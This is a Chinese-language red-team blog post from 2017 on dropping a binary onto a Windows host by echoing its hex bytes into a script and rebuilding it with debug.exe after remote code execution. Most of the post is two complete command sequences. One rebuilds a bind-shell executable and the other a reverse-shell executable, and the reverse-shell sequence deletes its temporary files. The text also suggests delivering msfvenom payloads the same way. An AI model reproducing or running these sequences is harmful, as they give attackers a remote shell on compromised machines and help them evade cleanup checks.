---
layout:     post
title:      "Some Ways To Create An Interactive Shell On Windows"
date:       2017-05-27
categories: [Pentest, Red Team]


---



在Twitter看到一种在windows下反弹cmd shell的方法，其实重点不在于反弹shell，而在于这种文件写入的方法可以运用到某些场景中会很方便，比如RCE没有回显时，就可以通过写入一个反弹功能的可执行文件获取到shell，但是你是如何写入该文件的？当然你可能会通过echo一个有下载功能vbs脚本，远程下载该可执行文件，或者powershell，或者bitsadmin，或者certutil，那么这里再介绍给你一种方法将可执行文件直接echo进去！

PS：如果小伙伴们还有好的方法可以交流一下！

### Creating a program that binds a shell to a port using a batch file

使用echo命令将需要上传的可执行文件的hex内容写入文件，最后debug还原文件。依次执行以下命令：

```shell
echo off && echo n 1.dll >123.hex && echo e 0100 >>123.hex
echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 67 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >>123.hex
echo e 0180 >>123.hex && echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 63 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex
echo e 0200 >>123.hex && echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 77 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >>123.hex
echo e 0280 >>123.hex && echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >>123.hex
echo e 0300 >>123.hex && echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 38 42 00 00 45 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c fa 31 40 03 6a 01 e8 fc 86 02 f9 f5 30 ba 18 fc fb bf 14 b2 c7 1f 6a 91 02 06 bd 3c 0c 02 e8 b0 23 a3 60 f6 59 66 c7 05 58 ce 4f 02 15 3a 19 e8 d8 5d 50 d9 aa 86 3d 66 a3 5a 31 c8 3c 5c a0 01 14 6a 10 68 29 14 ff 35 36 14 e8 82 12 29 05 0d 94 81 5e d0 0f ca  >>123.hex
echo e 0380 >>123.hex && echo 60 5c c5 a1 1e 05 88 3c 30 be c2 2a 44 51 45 04 ea 2d 14 fe 28 9f 42 68 48 93 a9 45 31 46 fb 28 e1 08 a5 8b 0b 85 46 14 e8 26 5f 07 c3 cc ff 25 20 1a 81 bb 2a 14 06 43 0c 21 1c 90 18 c8 10 64 04 4e cc 20 55 8b ec 81 c4 3f 7c fe f1 0c 56 57 e8 3a c7 89 03 45 fc 33 c9 8b 75 a9 ac 3c c0 74 07 e8 22 f2 f7 03 41 eb f4 51 d1 e9 90 e1 58 3b 01 c1 74 0b 5f 5e b8 03 10 c9 c2 08 e1 86 49 8d  >>123.hex
echo e 0400 >>123.hex && echo bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 48 f4 9d 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee e7 44 bb 1f 16 a9 ce 11  >>123.hex
echo e 0480 >>123.hex && echo 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 a8 92 52 e1 06 00 00 30 40 00 63 30 6d 64 00 81 3f 40 00 0c 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 61 71 63 1b 65 70 74 10 e1 69 73 db ca 6e 01 57 53 41 cb f9 61 72 f0 75 70 cf 18 68 23 6f 6e 73 1d 0e 62 69 94 64 19  >>123.hex
echo e 0500 >>123.hex && echo 9f c3 63 6b 65 74 bf 06 ff 03 e1 b1 91 1a 72 6e cd 6c 58 4a 47 c3 36 43 6f 6d 8b 61 37 5a 4c 62 cc 4c 80 fc 72 ed f7 3b a8 50 6f 6c ce 73 3b 21 00 00 00 00 00 00 81 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 ec be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >>123.hex
```

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/echo.png)

还原文件

```shell
echo r cx >>123.hex && echo 0477 >>123.hex && echo w >>123.hex && echo q >>123.hex && debug<123.hex && copy 1.dll bind.exe
```

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/bind.png)

指定端口进行监听，建立连接

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/2333.png)

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/shell.png)

### Sending a reverse shell using a batch file

这种就是反弹了，和以上操作一致

```shell
echo off && echo n 2.dll >1234.hex
echo e 0100 >>1234.hex && echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 df 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >>1234.hex
echo e 0180 >>1234.hex && echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 db 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>1234.hex
echo e 0200 >>1234.hex && echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 ef 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >>1234.hex
echo e 0280 >>1234.hex && echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >>1234.hex
echo e 0300 >>1234.hex && echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 b0 42 00 00 bd 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c 06 32 40 07 6a 01 e8 0e 7c 38 55 0c e8 42 02 c8 15 38 9e 6a 7e 38 ea 53 0c 7a 50 2c 16 74 41 30 fd 01 bf 55 b2 b1 33 6a 91 02 06 b2 7c 55 9a 27 a3 78 83 66 c7 05 64 7b 4f a6 38 67 bc 5d 50 66 94 3d 39 66 a3 68 7e 64 66 7e 21 7d 8b 73 0c d9 0a 6a 68 94 2d a1  >>1234.hex
echo e 0380 >>1234.hex && echo 3a 7a 6f 48 15 ea 4c 05 11 50 64 90 10 4d 44 55 91 14 3c 40 78 6a 28 10 68 5d 28 ff 35 30 74 e8 a4 9e 51 54 55 a1 55 8d bf 6e 0e 0a 08 90 22 0b e1 51 14 e8 1f 81 4b c3 ff 25 24 20 bb 6f 2a 1c 06 43 18 21 14 bd c3 22 08 71 cc 01 55 8b ec 81 c4 7c fe ff 88 56 57 e8 60 ac dd 89 45 fc 33 1d c9 8b 75 7e 38 3c 1d 74 07 1e 22 40 f7 41 eb f4 51 d1 72 e9 00 e1 58 3b c1 74 0b 5f 5e 30 b8 03  >>1234.hex
echo e 0400 >>1234.hex && echo b9 c9 c2 08 e1 86 49 8d bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 38 f4 b0 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee  >>1234.hex
echo e 0480 >>1234.hex && echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >>1234.hex
echo e 0500 >>1234.hex && echo 7c e9 6c c1 0c 60 75 77 06 f4 10 c0 40 02 d0 e1 1b c2 51 5b 3a 47 c4 49 19 ca 0c 57 06 08 30 00 00 30 40 00 63 30 6d 64 00 66 3f 40 00 14 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 67 07 65 74 68 6f 73 40 62 79 6e 61 7b 6d cf 1e 63 9e 3c f7 eb ff 0e 12 57 53 41 5d cf 61 72 46 75 70 18 79 68 ca 2c 73 13 4f 26 63 6b 62 ef c1 ff b8 03 6c 95 1a 72 ca 5e 6c 4c c7 57 d3 69 74 f3 46  >>1234.hex
echo e 0580 >>1234.hex && echo a7 bc 91 47 c3 4c 43 6f 6d 88 61 6e 64 36 4c 69 44 62 7e 80 76 72 fb 9d 3a 50 b7 82 e7 73 15 41 58 21 c0 64 48 d0 43 2f 60 00 00 00 00 00 66 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 74 be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >>1234.hex
echo r cx >>1234.hex && echo 04ef >>1234.hex && echo w >>1234.hex && echo q >>1234.hex && debug<1234.hex && copy 2.dll reverse.exe && del 2.dll && del 1234.hex
```

指定监听地址和端口并反弹

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/reverse.png)

> 当然你不必只用这个程序，这里介绍的只是一种方法，你可以用这种方法去上传用msfvenom生成的payload利用，甚至是你自己写的程序，更甚至是其他的攻击场景。。

使用OD简单看一下reverse.exe调用ws2_32.dll进行处理

![win reverse](http://reverse-tcp.xyz/static/img/posts/win reverse/ws2_32.png)







